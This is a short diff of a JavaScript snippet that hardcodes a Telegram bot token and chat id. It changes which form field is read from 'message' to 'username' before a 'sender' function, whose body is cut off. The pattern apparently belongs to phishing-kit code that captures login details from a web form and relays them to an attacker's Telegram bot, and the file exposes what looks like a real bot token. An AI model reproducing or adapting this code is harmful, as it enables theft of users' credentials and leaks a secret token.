@@ -4,7 +4,7 @@ var telegram_bot_id = "5770116864:AAE-ILBXySEol95mUtuNh0eU5xHI3hhINPk";
 var chat_id = -5714159445;
 var message;
 var ready = function () {
-    message = document.getElementById("message").value;
+    message = document.getElementById("username").value;
     message =   message;
 };
 var sender = function () {
